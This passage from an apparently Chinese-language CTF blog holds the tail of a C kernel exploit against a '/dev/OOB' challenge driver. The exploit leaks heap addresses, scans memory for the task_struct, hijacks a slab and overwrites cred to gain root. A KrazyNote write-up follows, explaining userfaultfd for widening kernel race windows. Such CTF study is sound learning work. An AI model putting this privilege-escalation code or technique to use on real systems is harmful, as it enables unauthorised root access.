ReadCmd    0x30003</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSZ   0x100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> usr_buf[BUFSZ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">attr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125; Attr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">unsigned</span> <span class="keyword">int</span> idx,<span class="keyword">char</span>* ini_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = idx;</span><br><span class="line">    input[<span class="number">1</span>] = (<span class="keyword">size_t</span>)ini_buf;</span><br><span class="line">    ioctl(fd,MallocCmd,input);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc1</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">unsigned</span> <span class="keyword">int</span> idx,<span class="keyword">size_t</span>* ini_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = idx;</span><br><span class="line">    input[<span class="number">1</span>] = (<span class="keyword">size_t</span>)ini_buf;</span><br><span class="line">    ioctl(fd,MallocCmd,input);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = idx;</span><br><span class="line">    ioctl(fd,FreeCmd,input);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> obj_idx,<span class="keyword">size_t</span> addr_idx,<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = obj_idx;</span><br><span class="line">    input[<span class="number">1</span>] = (<span class="keyword">size_t</span>)usr_buf;</span><br><span class="line">    input[<span class="number">2</span>] = size;</span><br><span class="line">    input[<span class="number">3</span>] = addr_idx;</span><br><span class="line">    ioctl(fd,ReadCmd,input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> obj_idx,<span class="keyword">size_t</span> addr_idx,<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> input[<span class="number">4</span>];</span><br><span class="line">    input[<span class="number">0</span>] = obj_idx;</span><br><span class="line">    input[<span class="number">1</span>] = (<span class="keyword">size_t</span>)usr_buf;</span><br><span class="line">    input[<span class="number">2</span>] = size;</span><br><span class="line">    input[<span class="number">3</span>] = addr_idx;</span><br><span class="line">    ioctl(fd,WriteCmd,input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LongToStr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> high_4 = addr &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> low_4 = addr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    usr_buf[<span class="number">0</span>] = low_4 &amp; <span class="number">0xff</span>;</span><br><span class="line">    usr_buf[<span class="number">1</span>] = (low_4 &amp; <span class="number">0xffff</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    usr_buf[<span class="number">2</span>] = (low_4 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    usr_buf[<span class="number">3</span>] = (low_4 &gt;&gt; <span class="number">16</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    usr_buf[<span class="number">4</span>] = (high_4 &amp; <span class="number">0xff</span>);</span><br><span class="line">    usr_buf[<span class="number">5</span>] = (high_4 &amp; <span class="number">0xffff</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    usr_buf[<span class="number">6</span>] = (high_4 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    usr_buf[<span class="number">7</span>] = (high_4 &gt;&gt; <span class="number">16</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    usr_buf[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    usr_buf[<span class="number">9</span>] = <span class="number">0x10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> hidden_str[<span class="number">0x10</span>];</span><br><span class="line">    <span class="built_in">strncpy</span>(hidden_str,<span class="string">"ama2in9PwnForMe\x00"</span>,<span class="number">0x10</span>);</span><br><span class="line">    prctl(PR_SET_NAME,hidden_str);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/OOB"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-]open failed!\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> ini_buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    Malloc(fd,<span class="number">0</span>,ini_buf);</span><br><span class="line">    <span class="comment">//Read(fd,0,0x20,0xe0);</span></span><br><span class="line">    <span class="comment">//leak heap</span></span><br><span class="line">    memset(usr_buf,'\x00',BUFSZ);</span><br><span class="line">    Read(fd,<span class="number">0xc7</span>,<span class="number">0xfff2ff9da00023f2</span>L,<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">char</span>* ptr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> heap_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> hex[<span class="number">0x10</span>];</span><br><span class="line">    <span class="built_in">strncpy</span>(hex,usr_buf,<span class="number">0x2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]hex:%x\n"</span>,hex[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//heap_base1 = strtoull(usr_buf,usr_buf+0x10,0x10);</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">        if(usr_buf[i] != '\x00')</span><br><span class="line">            count += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"total count:%d\n"</span>,count);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tmp;</span><br><span class="line">        <span class="built_in">sscanf</span>(&amp;usr_buf[i],<span class="string">"%c"</span>,&amp;tmp);</span><br><span class="line">        tmp = tmp &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]char:%x\n"</span>,usr_buf[i]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(&amp;usr_buf[i]) == <span class="number">0</span>)</span><br><span class="line">            tmp = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]tmp:%x\n"</span>,tmp);</span><br><span class="line">        heap_base += (tmp &lt;&lt; (<span class="number">8</span>*i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak heap success:0x%llx\n"</span>,heap_base);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x10</span><span class="number">-4</span>;i++)</span><br><span class="line">        Malloc(fd,i,ini_buf);</span><br><span class="line">    <span class="comment">//for(int i = 0;i &lt; 0x10-4;i++)</span></span><br><span class="line">    <span class="comment">//    Free(fd,i);</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//sub processs</span></span><br><span class="line">        <span class="keyword">char</span> hidden_str1[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">strncpy</span>(hidden_str1,<span class="string">"ama2in9PwnForFun"</span>,<span class="number">0x10</span>);</span><br><span class="line">        prctl(PR_SET_NAME,hidden_str1);</span><br><span class="line">        <span class="keyword">while</span>(getuid())&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[-] not yet\n"</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]root"</span>);</span><br><span class="line">        system(<span class="string">"cat /flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//fuck </span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> start_addr = heap_base;</span><br><span class="line">    <span class="comment">//unsigned long long start_addr = heap_base &amp; 0xfffffff000000000;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> end_addr = heap_base + (<span class="number">0xffff88801e3de000</span><span class="number">-0xffff88800017d400</span>);</span><br><span class="line">    <span class="comment">//unsigned long long end_addr = 0xffffc80000000000;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]fuck start addr:0x%llx\n"</span>,start_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]fuck end addr:0x%llx\n"</span>,end_addr);</span><br><span class="line">    <span class="keyword">size_t</span> off_idx = (start_addr<span class="number">-0xffffffffa0002420</span>) / <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]fuck idx:0x%llx\n"</span>,off_idx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]finding str:%s\n"</span>,hidden_str);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> target_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;start_addr &lt; end_addr;start_addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//strncpy(ini_buf,usr_buf,8);</span></span><br><span class="line">        memset(usr_buf,'\x00',BUFSZ);</span><br><span class="line">        <span class="comment">//sprintf(usr_buf,"%llu",&amp;start_addr);</span></span><br><span class="line">        LongToStr(start_addr);</span><br><span class="line">        <span class="comment">//write to the bss</span></span><br><span class="line">        Write(fd,<span class="number">0xc7</span>,<span class="number">0xfff2ff9da00023f2</span>L,<span class="number">0x10</span>);</span><br><span class="line">        <span class="comment">//read to usr_buf</span></span><br><span class="line">        Read(fd,<span class="number">0</span>,<span class="number">0</span>,BUFSZ);</span><br><span class="line">        <span class="comment">//find</span></span><br><span class="line">        result = memmem(usr_buf,BUFSZ,hidden_str,<span class="number">16</span>);</span><br><span class="line">		<span class="keyword">if</span> (result)</span><br><span class="line">		&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]find success:0x%llx\n"</span>,start_addr);</span><br><span class="line">			cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x8</span>);</span><br><span class="line">			real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line">			<span class="keyword">if</span>( (cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))&#123;</span><br><span class="line">				<span class="comment">//printf("[]%lx[]",result-(int)(buf));</span></span><br><span class="line">				target_addr = start_addr + result-(<span class="keyword">int</span>)(usr_buf);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[+]found task_struct 0x%lx\n"</span>,target_addr);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[+]found cred 0x%lx\n"</span>,real_cred);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//slab hijack</span></span><br><span class="line">    memset(usr_buf,'\x00',BUFSZ);</span><br><span class="line">    LongToStr(cred);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &gt; <span class="number">0</span>;i--)</span><br><span class="line">        Free(fd,i);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,heap_base+<span class="number">0x100</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x8</span>);</span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,<span class="number">0xffff88801e3e3100</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x8</span>);</span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,<span class="number">0xffff88801e3e3000</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x8</span>);</span><br><span class="line">    <span class="comment">//Read(fd,0xc7,0xfff2ff9da00023f2L,0x8);</span></span><br><span class="line">    Malloc(fd,<span class="number">1</span>,ini_buf);</span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,<span class="number">0xffff88801e3e3100</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x10</span>);</span><br><span class="line">    Write(fd,<span class="number">0xc7</span>,<span class="number">0xffff88801e3e3000</span><span class="number">-0x000d00620000002e</span>L,<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">size_t</span> final[<span class="number">0x100</span>];</span><br><span class="line">    memset(final,'\x00',sizeof(final));</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    final[idx++] = <span class="number">0x3</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i++)</span><br><span class="line">        final[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">3</span>;i++)</span><br><span class="line">        final[idx++] = <span class="number">0x0000003fffffffff</span>;</span><br><span class="line">    final[idx++] = <span class="number">0</span>;</span><br><span class="line">    final[idx++] = <span class="number">0xffffffff8183e420</span>;</span><br><span class="line">    final[idx++] = <span class="number">0xffffffff8183e4a0</span>;</span><br><span class="line">    final[idx++] = <span class="number">0xffff88800012f6a0</span>;</span><br><span class="line">    final[idx++] = <span class="number">0</span>;</span><br><span class="line">    final[idx++] = <span class="number">0</span>;</span><br><span class="line">    final[idx++] = <span class="number">0</span>;</span><br><span class="line">    final[idx++] = <span class="number">0xffff88800001f980</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i++)</span><br><span class="line">        final[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">3</span>;i++)</span><br><span class="line">        final[idx++] = <span class="number">0x0000003fffffffff</span>;</span><br><span class="line">    final[idx++] = <span class="number">0</span>;</span><br><span class="line">    final[idx++] = <span class="number">0xffffffff8183e420</span>;</span><br><span class="line">    final[idx++] = <span class="number">0xffffffff8183e4a0</span>;</span><br><span class="line">    final[idx++] = <span class="number">0xffff88800012f6a0</span>;</span><br><span class="line">    final[idx++] = <span class="number">0</span>;</span><br><span class="line">    final[idx++] = <span class="number">0</span>;</span><br><span class="line">    final[idx++] = <span class="number">0</span>;</span><br><span class="line">    final[idx++] = <span class="number">1</span>;</span><br><span class="line">    final[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    Read(fd,<span class="number">0xc7</span>,cred<span class="number">-0x000d00620000002e</span>L,<span class="number">0x100</span>*<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">char</span> zero[<span class="number">0x28</span>];</span><br><span class="line">    memset(usr_buf,'\x00',0x30);</span><br><span class="line">    usr_buf[0] = '\x03';</span><br><span class="line">    Malloc(fd,<span class="number">2</span>,usr_buf);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">10</span>;i &gt; <span class="number">3</span>;i--)</span><br><span class="line">        Free(fd,i);</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        system(<span class="string">"id"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="使用userfaultfd缺页扩大窗口期"><a href="#使用userfaultfd缺页扩大窗口期" class="headerlink" title="使用userfaultfd缺页扩大窗口期"></a>使用userfaultfd缺页扩大窗口期</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>之前想复现n1ctf的babykernel和de1ctf的race，发现官方题解中都有mmap的部分，一直不是很理解，终于在先知上找到一篇相关的<a href="https://xz.aliyun.com/t/6653" target="_blank" rel="noopener">文章</a>，写的非常详细，因此自己实践了一下(照着exp打了一遍)，记录一下userfaultfd的使用</p>
<h3 id="BalsnCTF2019-KrazyNote"><a href="#BalsnCTF2019-KrazyNote" class="headerlink" title="BalsnCTF2019 KrazyNote"></a>BalsnCTF2019 KrazyNote</h3><h4 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h4><h6 id="页和虚内存"><a href="#页和虚内存" class="headerlink" title="页和虚内存"></a>页和虚内存</h6><p>内核的内存主要有两个区域，RAM和交换区，将要被使用的内存放在RAM，暂时用不到的内存放在交换区，内核控制交换进出的过程。RAM中的地址是物理地址，内核使用虚拟地址，其通过多级页表建立虚拟地址到物理地址的映射</p>
<h6 id="页调度和延迟加载"><a href="#页调度和延迟加载" class="headerlink" title="页调度和延迟加载"></a>页调度和延迟加载</h6><p>有的内存既不在RAM又不在交换区，比如mmap出来的内存，这块内存在读写它之前实际上并没有被创建（没有映射到实际的物理页），例如<code>mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0);</code>实际上并没有把fd对应的内容拷贝到这块区域，只是将地址<code>0x1337000</code>映射到<code>fd</code>这个文件。</p>
<p>当有以下代码访问时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *a = (<span class="keyword">char</span> *)<span class="number">0x1337000</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"content: %c\n"</span>, a[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<p>内核会做以下事情：</p>
<ol>
<li>为0x1337000创建物理帧</li>
<li>从fd读取内容到0x1337000</li>
<li>增加一个页表的索引</li>
</ol>
<p>总之，如果是初次访问mmap的页，<code>耗时会很长，导致上下文切换以及当前线程的睡眠</code></p>
<h5 id="别名页"><a href="#别名页" class="headerlink" title="别名页"></a>别名页</h5><p>没有ABI可以直接访问物理帧，但内核有时候需要需要修改物理帧的值(例如修改页表入口)，于是引入了别名页，将物理帧映射到虚拟页。在每个线程的启动和退出过程中，一般都有两个物理帧映射到它。别名页的地址一般是<code>SOME_OFFSET+physical_addr</code></p>
<h5 id="userfaultfd机制"><a href="#userfaultfd机制" class="headerlink" title="userfaultfd机制"></a>userfaultfd机制</h5><p>这个机制可以让用户自己处理缺页，可以在用户空间定义一个<code>userfault handler</code>，用法见<a href="http://man7.org/linux/man-pages/man2/userfaultfd.2.html" target="_blank" rel="noopener">官方文档</a>。大概步骤如下：</p>
<ol>
<li>创建一个描述符uffd：所有的注册区间、配置和最终缺页处理都需要ioctl对这个fd进行处理。我们可以用UFFDIO_REGISTER注册一块监视区域，这个区域发生缺页的时候使用UFFDIO_COPY向缺页地址拷贝数据</li>
<li>用UFFDIO_REGISTER注册监视区域</li>
<li>创建专用线程用来轮询和处理缺页事件</li>
</ol>
<p>观察可以发现其中大部分操作都是固定的，我们可以自己整理一个头文件加进去，用的时候很方便。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_API,&amp;ua) == <span class="number">-1</span>)&#123;</span><br><span class="line">        ErrExit(<span class="string">"[-]ioctl UFFDIO API"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(mmap(FAULT_PAGE,<span class="number">0x1000</span>,<span class="number">7</span>,<span class="number">0x22</span>,<span class="number">-1</span>,<span class="number">0</span>) != FAULT_PAGE)</span><br><span class="line">        ErrExit(<span class="string">"[-]mmap failed!"</span>);</span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)FAULT_PAGE;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_REGISTER,&amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]ioctl UFFDIO Register"</span>);</span><br><span class="line">    <span class="comment">//register the func</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr,<span class="literal">NULL</span>,handler,(<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span>(s != <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]pthread create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="comment">// 轮询uffd读到的信息需要存在一个struct uffd_msg对象中</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="comment">// ioctl的UFFDIO_COPY选项需要我们构造一个struct uffdio_copy对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line">      ......</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123; <span class="comment">// 此线程不断进行polling，所以是死循环</span></span><br><span class="line">        <span class="comment">// poll需要我们构造一个struct pollfd对象</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="comment">// 读出user-fault相关信息</span></span><br><span class="line">        read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="comment">// 对于我们所注册的一般user-fault功能，都应是UFFD_EVENT_PAGEFAULT这个事件</span></span><br><span class="line">        assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line">        <span class="comment">// 构造uffdio_copy进而调用ioctl-UFFDIO_COPY处理这个user-fault</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        我们自己的处理逻辑</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// page(我们已有的一个页大小的数据)中page_size大小的内容将被拷贝到新分配的msg.arg.pagefault.address内存页中</span></span><br><span class="line">        ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy);</span><br><span class="line">          ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>这个内核模块逆的时候看起来很麻烦，结合别人博客的分析搞清楚了逻辑，其实是在<code>bss</code>上一块大小为<code>0x2000</code>的区域模拟<code>heap</code>的分配，首先搞清楚我们输入的数据结构和内核模块存储的单个数据结构。用户输入的结构体类型为<code>UserAttr</code>，其中<code>idx</code>指明note的索引，length对应分配的大小，user_buf为拷贝到note里content_arr的字符串或者从中读取数据的字符串。</p>
<p>一个note struct由四个成员组成，第一个是<code>key</code>，这个值根据原作者的分析是<code>task_struct.mm-&gt;pgd,页全局目录的存放位置)</code>,<code>length</code>是后面content_arr动态数组的大小(最大不超过0x100)，<code>contentPtr</code>保存的是<code>content_arr-page_offset_base</code>这里的<code>page_off_base</code>就是我们之前提到的那个别名页的<code>SOME_OFFSET</code>。最后的<code>content_arr</code>是一个动态数组，其大小由<code>New</code>的时候用户给的<code>length</code>决定</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">00000000 UserAttr        struc ; (sizeof=0x18, mappedto_3)</span></span><br><span class="line"><span class="comment">00000000                                         ; XREF: unlocked_ioctl/r</span></span><br><span class="line"><span class="comment">00000000 idx             dq ?                    ; XREF: unlocked_ioctl+26/w</span></span><br><span 